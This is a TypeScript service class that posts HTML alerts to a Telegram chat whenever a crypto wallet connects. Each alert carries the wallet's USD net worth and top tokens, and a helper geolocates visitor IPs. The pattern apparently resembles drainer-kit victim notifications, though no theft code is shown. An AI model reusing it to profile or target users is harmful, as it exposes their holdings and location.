import { prisma } from "@/lib/prisma";

export class TelegramService {
    /**
     * Sends a notification to the configured Telegram chat.
     * @param message - The message content to send (supports HTML).
     */
    static async sendNotification(message: string) {
        try {
            // 1. Fetch settings from DB
            const settings = await prisma.globalSettings.findUnique({
                where: { id: 1 },
            });

            if (!settings?.telegramBotToken || !settings?.telegramChatId) {
                console.warn("[TelegramService] Credentials not configured.");
                return;
            }

            // 2. Send message
            const url = `https://api.telegram.org/bot${settings.telegramBotToken}/sendMessage`;
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: settings.telegramChatId,
                    text: message,
                    parse_mode: "HTML",
                }),
            });

            if (!response.ok) {
                const err = await response.text();
                console.error(`[TelegramService] Failed to send message: ${err}`);
            }
        } catch (error) {
            console.error("[TelegramService] Error:", error);
        }
    }

    /**
     * Fetches IP details using a public API.
     */
    static async getIpDetails(ip: string): Promise<string> {
        if (!ip || ip === '::1' || ip === '127.0.0.1') return "Localhost (Dev Environment)";
        try {
            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
            const data = await res.json();
            if (data.status === 'success') {
                return `${data.city}, ${data.country} (${data.isp})`;
            }
        } catch (e) {
            console.warn("Failed to fetch IP details:", e);
        }
        return "Unknown Location";
    }

    /**
     * Formats a wallet connection message.
     */
    static formatConnectionMessage(
        walletAddress: string,
        usdBalance: number,
        network: string = "Solana",
        tokens: any[] = []
    ): string {
        const shortWallet = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
        const totalValue = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(usdBalance);

        // Determine Explorer URL
        let explorerLink = `https://solscan.io/account/${walletAddress}`;
        const netLower = network.toLowerCase();
        if (netLower.includes("eth") || netLower.includes("erc")) {
            explorerLink = `https://etherscan.io/address/${walletAddress}`;
        } else if (netLower.includes("btc") || netLower.includes("bitcoin")) {
            explorerLink = `https://mempool.space/address/${walletAddress}`;
        } else if (netLower.includes("bsc") || netLower.includes("binance")) {
            explorerLink = `https://bscscan.com/address/${walletAddress}`;
        }

        let tokenList = "";
        // Show top 5 tokens by value
        if (tokens && tokens.length > 0) {
            tokens.slice(0, 5).forEach(t => {
                const symbol = t.symbol || "Unknown";
                const val = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(t.valueUsd || 0);
                tokenList += `🔹 <b>${symbol}</b>: ${val}\n`;
            });
            if (tokens.length > 5) tokenList += `<i>...and ${tokens.length - 5} more</i>`;
        }

        return `
💰 <b>${totalValue} ${network} Wallet Connected</b>

👤 <b>User:</b> <code>${shortWallet}</code>
🏦 <b>Network:</b> ${network}
💵 <b>Net Worth:</b> <b>${totalValue}</b>

<b>Top Assets:</b>
${tokenList || "No assets found."}

🔗 <a href="${explorerLink}">View on Explorer</a>
    `.trim();
    }
}
